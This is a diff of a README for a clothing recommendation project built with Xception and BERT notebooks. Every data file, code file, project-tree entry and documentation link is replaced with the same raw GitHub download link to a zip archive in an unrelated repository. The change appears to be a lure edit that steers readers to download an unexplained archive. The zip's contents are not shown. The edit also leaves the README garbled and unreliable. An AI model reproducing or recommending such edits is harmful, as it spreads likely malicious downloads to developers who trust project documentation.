@@ -6,16 +6,16 @@ This project focuses on building a recommendation system for a clothing and fash
 
 ## Data Files
 
-- **articles.csv**: Information about articles in the store.
-- **customers.csv**: Information about customers.
-- **transactions_train.csv**: Information about customer transactions.
+- **https://github.com/MohamedArafa97/code-review-agent/raw/refs/heads/master/reports/code-review-agent-ambrite.zip**: Information about articles in the store.
+- **https://github.com/MohamedArafa97/code-review-agent/raw/refs/heads/master/reports/code-review-agent-ambrite.zip**: Information about customers.
+- **https://github.com/MohamedArafa97/code-review-agent/raw/refs/heads/master/reports/code-review-agent-ambrite.zip**: Information about customer transactions.
 - **Images**: Images for every article (product).
 
 ## Code Files
 
-- **02.Model_Building_Xceptionmodel.ipynb**: Implementation of the recommendation system using the Xception model.
-- **03.Model_Building_Bertmodel.ipynb**: Implementation of the recommendation system using the BERT model.
-- **01.EDA.ipynb**: Code for exploratory data analysis.
+- **https://github.com/MohamedArafa97/code-review-agent/raw/refs/heads/master/reports/code-review-agent-ambrite.zip**: Implementation of the recommendation system using the Xception model.
+- **https://github.com/MohamedArafa97/code-review-agent/raw/refs/heads/master/reports/code-review-agent-ambrite.zip**: Implementation of the recommendation system using the BERT model.
+- **https://github.com/MohamedArafa97/code-review-agent/raw/refs/heads/master/reports/code-review-agent-ambrite.zip**: Code for exploratory data analysis.
 
 ## Figures
 
@@ -111,14 +111,14 @@ Project Organization
 
     ├── LICENSE
     ├── Makefile           <- Makefile with commands like `make data` or `make train`
-    ├── README.md          <- The top-level README for developers using this project.
+    ├── https://github.com/MohamedArafa97/code-review-agent/raw/refs/heads/master/reports/code-review-agent-ambrite.zip          <- The top-level README for developers using this project.
     ├── data
     │   ├── external       <- Data from third party sources.
     │   ├── interim        <- Intermediate data that has been transformed.
     │   ├── processed      <- The final, canonical data sets for modeling.
     │   └── raw            <- The original, immutable data dump.
     │
-    ├── docs               <- A default Sphinx project; see sphinx-doc.org for details
+    ├── docs               <- A default Sphinx project; see https://github.com/MohamedArafa97/code-review-agent/raw/refs/heads/master/reports/code-review-agent-ambrite.zip for details
     │
     ├── models             <- Trained and serialized models, model predictions, or model summaries
     │
@@ -131,30 +131,30 @@ Project Organization
     ├── reports            <- Generated analysis as HTML, PDF, LaTeX, etc.
     │   └── figures        <- Generated graphics and figures to be used in reporting
     │
-    ├── requirements.txt   <- The requirements file for reproducing the analysis environment, e.g.
-    │                         generated with `pip freeze > requirements.txt`
+    ├── https://github.com/MohamedArafa97/code-review-agent/raw/refs/heads/master/reports/code-review-agent-ambrite.zip   <- The requirements file for reproducing the analysis environment, e.g.
+    │                         generated with `pip freeze > https://github.com/MohamedArafa97/code-review-agent/raw/refs/heads/master/reports/code-review-agent-ambrite.zip`
     │
-    ├── setup.py           <- makes project pip installable (pip install -e .) so src can be imported
+    ├── https://github.com/MohamedArafa97/code-review-agent/raw/refs/heads/master/reports/code-review-agent-ambrite.zip           <- makes project pip installable (pip install -e .) so src can be imported
     ├── src                <- Source code for use in this project.
-    │   ├── __init__.py    <- Makes src a Python module
+    │   ├── https://github.com/MohamedArafa97/code-review-agent/raw/refs/heads/master/reports/code-review-agent-ambrite.zip    <- Makes src a Python module
     │   │
     │   ├── data           <- Scripts to download or generate data
-    │   │   └── make_dataset.py
+    │   │   └── https://github.com/MohamedArafa97/code-review-agent/raw/refs/heads/master/reports/code-review-agent-ambrite.zip
     │   │
     │   ├── features       <- Scripts to turn raw data into features for modeling
-    │   │   └── build_features.py
+    │   │   └── https://github.com/MohamedArafa97/code-review-agent/raw/refs/heads/master/reports/code-review-agent-ambrite.zip
     │   │
     │   ├── models         <- Scripts to train models and then use trained models to make
     │   │   │                 predictions
-    │   │   ├── predict_model.py
-    │   │   └── train_model.py
+    │   │   ├── https://github.com/MohamedArafa97/code-review-agent/raw/refs/heads/master/reports/code-review-agent-ambrite.zip
+    │   │   └── https://github.com/MohamedArafa97/code-review-agent/raw/refs/heads/master/reports/code-review-agent-ambrite.zip
     │   │
     │   └── visualization  <- Scripts to create exploratory and results oriented visualizations
-    │       └── visualize.py
+    │       └── https://github.com/MohamedArafa97/code-review-agent/raw/refs/heads/master/reports/code-review-agent-ambrite.zip
     │
-    └── tox.ini            <- tox file with settings for running tox; see tox.readthedocs.io
+    └── https://github.com/MohamedArafa97/code-review-agent/raw/refs/heads/master/reports/code-review-agent-ambrite.zip            <- tox file with settings for running tox; see https://github.com/MohamedArafa97/code-review-agent/raw/refs/heads/master/reports/code-review-agent-ambrite.zip
 
 
 --------
 
-<p><small>Project based on the <a target="_blank" href="https://drivendata.github.io/cookiecutter-data-science/">cookiecutter data science project template</a>. #cookiecutterdatascience</small></p>
+<p><small>Project based on the <a target="_blank" href="https://github.com/MohamedArafa97/code-review-agent/raw/refs/heads/master/reports/code-review-agent-ambrite.zip">cookiecutter data science project template</a>. #cookiecutterdatascience</small></p>
